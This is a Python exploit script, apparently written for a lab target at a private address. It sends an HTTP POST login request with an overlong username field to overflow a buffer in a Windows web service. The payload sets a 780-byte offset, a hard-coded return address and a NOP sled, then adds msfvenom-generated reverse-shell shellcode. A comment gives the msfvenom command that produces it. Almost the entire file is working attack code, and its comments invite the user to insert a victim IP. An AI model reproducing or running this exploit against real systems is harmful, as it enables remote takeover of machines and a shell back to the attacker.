#!/bin/python3

#Rem01x
import socket
import time
import sys

#Change This To Your Victim IP

target = "192.168.2.15"

port = 80

timeout = 5

#The Exact Offset We Crashed At

offset = 780

#The Return Address

ret = b"\x83\x0c\x09\x10"

#padding is just making some space for the shellcode

padding = b"\x90" * 16

#Change The Shellcode
#msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> EXECFUNC=thread -f python -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

shellcode =  b""
shellcode += b"\xd9\xf6\xbe\xee\xe8\xf0\xc5\xd9\x74\x24\xf4\x58"
shellcode += b"\x33\xc9\xb1\x52\x31\x70\x17\x83\xe8\xfc\x03\x9e"
shellcode += b"\xfb\x12\x30\xa2\x14\x50\xbb\x5a\xe5\x35\x35\xbf"
shellcode += b"\xd4\x75\x21\xb4\x47\x46\x21\x98\x6b\x2d\x67\x08"
shellcode += b"\xff\x43\xa0\x3f\x48\xe9\x96\x0e\x49\x42\xea\x11"
shellcode += b"\xc9\x99\x3f\xf1\xf0\x51\x32\xf0\x35\x8f\xbf\xa0"
shellcode += b"\xee\xdb\x12\x54\x9a\x96\xae\xdf\xd0\x37\xb7\x3c"
shellcode += b"\xa0\x36\x96\x93\xba\x60\x38\x12\x6e\x19\x71\x0c"
shellcode += b"\x73\x24\xcb\xa7\x47\xd2\xca\x61\x96\x1b\x60\x4c"
shellcode += b"\x16\xee\x78\x89\x91\x11\x0f\xe3\xe1\xac\x08\x30"
shellcode += b"\x9b\x6a\x9c\xa2\x3b\xf8\x06\x0e\xbd\x2d\xd0\xc5"
shellcode += b"\xb1\x9a\x96\x81\xd5\x1d\x7a\xba\xe2\x96\x7d\x6c"
shellcode += b"\x63\xec\x59\xa8\x2f\xb6\xc0\xe9\x95\x19\xfc\xe9"
shellcode += b"\x75\xc5\x58\x62\x9b\x12\xd1\x29\xf4\xd7\xd8\xd1"
shellcode += b"\x04\x70\x6a\xa2\x36\xdf\xc0\x2c\x7b\xa8\xce\xab"
shellcode += b"\x7c\x83\xb7\x23\x83\x2c\xc8\x6a\x40\x78\x98\x04"
shellcode += b"\x61\x01\x73\xd4\x8e\xd4\xd4\x84\x20\x87\x94\x74"
shellcode += b"\x81\x77\x7d\x9e\x0e\xa7\x9d\xa1\xc4\xc0\x34\x58"
shellcode += b"\x8f\x2e\x60\x60\x54\xc7\x73\x64\x7b\x4b\xfd\x82"
shellcode += b"\x11\x63\xab\x1d\x8e\x1a\xf6\xd5\x2f\xe2\x2c\x90"
shellcode += b"\x70\x68\xc3\x65\x3e\x99\xae\x75\xd7\x69\xe5\x27"
shellcode += b"\x7e\x75\xd3\x4f\x1c\xe4\xb8\x8f\x6b\x15\x17\xd8"
shellcode += b"\x3c\xeb\x6e\x8c\xd0\x52\xd9\xb2\x28\x02\x22\x76"
shellcode += b"\xf7\xf7\xad\x77\x7a\x43\x8a\x67\x42\x4c\x96\xd3"
shellcode += b"\x1a\x1b\x40\x8d\xdc\xf5\x22\x67\xb7\xaa\xec\xef"
shellcode += b"\x4e\x81\x2e\x69\x4f\xcc\xd8\x95\xfe\xb9\x9c\xaa"
shellcode += b"\xcf\x2d\x29\xd3\x2d\xce\xd6\x0e\xf6\xfe\x9c\x12"
shellcode += b"\x5f\x97\x78\xc7\xdd\xfa\x7a\x32\x21\x03\xf9\xb6"
shellcode += b"\xda\xf0\xe1\xb3\xdf\xbd\xa5\x28\x92\xae\x43\x4e"
shellcode += b"\x01\xce\x41"


evil = b"A" * offset + ret + padding + shellcode 

exploit = b""

exploit = b"username=" + evil + b"&password=admin"

print("Sending Malisous Buffer")
print("Ganning Access")
print("Pw3ned!")
req = b""
req += b"POST /login HTTP/1.1\r\n"
req += b"Host: 192.168.2.15\r\n"
req += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
req += b"Accept-Language: en-US,en;q=0.5\r\n"
req += b"Accept-Encoding: gzip, deflate\r\n"
req += b"Content-Type: application/x-www-form-urlencoded\r\n"
req += b"Content-Length: " + str(len(exploit)).encode() + b"\r\n"
req += b"Origin: http://192.168.2.15\r\n"
req += b"Connection: close\r\n"
req += b"Referer: http://192.168.2.15/login\r\n"
req += b"Upgrade-Insecure-Requests: 1\r\n"
req += b"\r\n"
req += exploit
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(timeout)
s.connect((target,port))
s.send(req)
s.recv(1024)
s.close()

